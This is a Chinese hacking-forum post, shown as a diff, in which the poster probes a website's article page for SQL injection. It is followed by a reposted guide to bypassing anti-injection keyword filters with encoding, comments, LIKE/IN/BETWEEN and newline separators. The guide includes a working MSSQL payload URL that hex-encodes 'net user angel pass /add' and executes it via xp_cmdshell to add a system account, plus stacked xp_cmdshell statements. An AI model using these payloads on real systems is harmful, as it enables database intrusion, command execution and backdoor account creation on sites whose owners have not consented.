@@ -1,0 +1,122 @@
+路过这个网站,检测了一下.
+http://www.xxx.cn/Article.asp?ID=117 and 1=1
+直接返回主页
+http://www.xxx.cn/Article.asp?ID=117 or 1=1
+直接返回主页
+http://www.xxx.cn/Article.asp?ID=117 or
+没有返回主页 没有过滤or
+http://www.xxx.cn/Article.asp?ID=117 and
+直接返回主页 看来过滤了and
+http://www.xxx.cn/Article.asp?ID=117 or 1
+没有返回主页 即没有过滤or 也没有过滤1
+http://www.xxx.cn/Article.asp?ID=117 or 1=1
+直接返回主页 很明显过滤了等号 
+or的特性是与and相反的.
+or 1=1 爆错 或与原页面不同
+or 1=2 原页面相同
+这样就是一个注入点
+但他过滤了=号 我就用><号代替=号吧!
+or 1<2 很明显是正确的,所以应该与原页面不同
+or 1>2 很明显是错误的,所以应该与原页面相同
+然后看看有没有过滤其他的查询语句,比如select.
+http://www.xxx.cn/Article.asp?ID=117 select
+直接返回主页
+又迷茫了..
+
+
+cookies注入.和以下的方法全都试过了,都失败了.还有什么方法可以饶过吗
+这个系统我以为是my动力,后台却是这样的http://www.xxx.cn/admin.asp(应该不是假够台吧)
+================================================
+以下是转贴:
+
+突然想我们是否可以用什么方法绕过SQL注入的限制呢？到网上考察了一下，提到的方法大多都是针对AND与“’”号和“=”号过滤的突破，虽然有点进步的地方，但还是有一些关键字没有绕过，由于我不常入侵网站所以也不敢对上述过滤的效果进行评论，但是可以肯定的是，效果不会很好…… 
+经过我的收集，大部分的防注入程序都过滤了以下关键字： 
+and | select | update | chr | delete | %20from | ; | insert | mid | master. | set | = 
+而这里最难处理的就是select这个关键字了，那么我们怎样来突破他们呢？问题虽未完全解决，但还是说出来与大家分享一下，希望能抛砖引玉。 
+对于关键字的过滤，以下是我收集的以及我个人的一些想法。 
+1、运用编码技术绕过 
+如URLEncode编码，ASCII编码绕过。例如or 1=1即 
+%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 
+
+2、通过空格绕过 
+如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如 
+or’ swords’ =‘swords’ 
+，由于mssql的松散性，我们可以把or ’swords’ 之间的空格去掉，并不影响运行。 
+3、运用字符串判断代替 
+用经典的or 1=1判断绕过,如 
+or ’swords’ =’swords’ 
+，这个方法就是网上在讨论的。 
+4、通过类型转换修饰符N绕过 
+可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ’swords’ = N’ swords’ ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。 
+5、通过+号拆解字符串绕过 
+效果值得考证，但毕竟是一种方法。如 
+or ’swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ’+’ …..’ ) 
+
+6、通过LIKE绕过 
+以前怎么就没想到呢？如or 
+’swords’ LIKE ’sw’ 
+！！！显然可以很轻松的绕过 
+“=”“>” 
+的限制…… 
+7、通过IN绕过 
+与上面的LIKE的思路差不多,如 
+or ’swords’ IN (’swords’) 
+
+8、通过BETWEEN绕过 
+如 
+or ’swords’ BETWEEN ’rw’ AND ’tw’ 
+
+9、通过>或者<绕过 
+or ’swords’ > ’sw’ 
+or ’swords’ < ’tw’ 
+or 1<3 
+…… 
+10、运用注释语句绕过 
+用/**/代替空格，如： 
+UNION /**/ Select /**/user，pwd，from tbluser 
+
+用/**/分割敏感词，如： 
+U/**/ NION /**/ SE/**/ LECT /**/user，pwd from tbluser 
+
+11、用HEX绕过，一般的IDS都无法检测出来 
+0x730079007300610064006D0069006E00 =hex(sysadmin) 
+0x640062005F006F0077006E0065007200 =hex(db_owner) 
+另外，关于通用点的过滤方法，我们可以考虑采用赋值的方法，例如先声明一个变量a，然后把我们的指令赋值给a，然后调用变量a最终执行我们输入的命令。变量a可以是任何命令。如下： 
+　　declare @a sysname 
+　　select @a= 
+　　exec master.dbo.xp_cmdshell @a 
+效果 
+http://www.ilikeplmm.com/show.asp?id=1;declare%20@a% [email=20sysname%20select%20@a=0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400%20exec%20master.dbo.xp_cmdshell%20@a]20sysname%20select%20@a=0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400%20exec%20master.dbo.xp_cmdshell%20@a[/email];-- 
+
+其中的 
+0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 
+就是 
+“net user angel pass /add”
+
+一直以来都以为只有空格，tab键和注释符/**/可以用来切割sql关键字，段时间在邪八看了风迅cms注入漏洞那篇帖子，才知道原来回车也可以用来作为分割符（以前竟然没有想到，真是失败）。回车的ascii码是chr(13)&chr(10)，至于为什么要两个连在一起，这个我也不知道。转换成url编码形式是%0d%0a，于是就可以用%0d%0a代替空格pass一些过滤空格的检查了。
+引申一下，只用%0d能正常执行语句吗？只用%0a呢？测试证明，用任意一种分割在mssql、mysql和access里面都是可以的。
+另外，关于mssql的多语句问题。我以前一直以为必须用分号作为语句的结尾，后来发现，完全不是那样。类似
+Copy code
+select * from table exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table/**/exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table|---tab---|exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table|---enter---|exec xp_cmdshell'xxxxxxxxxx'
+
+的语句都是可以正常执行的。而我以前竟然一直不知道！不过这个貌似跟连接数据库驱动有关系，odbc可以正常执行，sqloledb的话就会报错。有兴趣的继续研究吧?
+
+这样，以后遇到带空格过滤关键字的拦截程序，又可以发挥发挥了
+可能大家早就知道了，不管怎么说，发在这里吧！
+
+最近想起可能还有些ascii码可以用来在sql语句中代替空格，于是写个脚本测试了一下，结果在所有128个低位ascii字符中，chr(12)也可以在access里用，不过貌似chr(12)不能出现在and、or之类的关键词附近，原因不清楚。mysql中比access多一个chr(11)可以。至于mssql，挖日，直接从1到32的ascii码换成字符后都可以正常使用。
+
+
+
+对于中间应该出现空格的地方，用()进行替换，不过，对于很复杂的SQL语句就不太好用了。上面说到的是字符型的，如果是数值型，可以在id=1后加一个括号，不过这个我没有测试，
+比如:jmdcw.asp?id=(1)and(select.....)，应该是可行的吧？ 
+
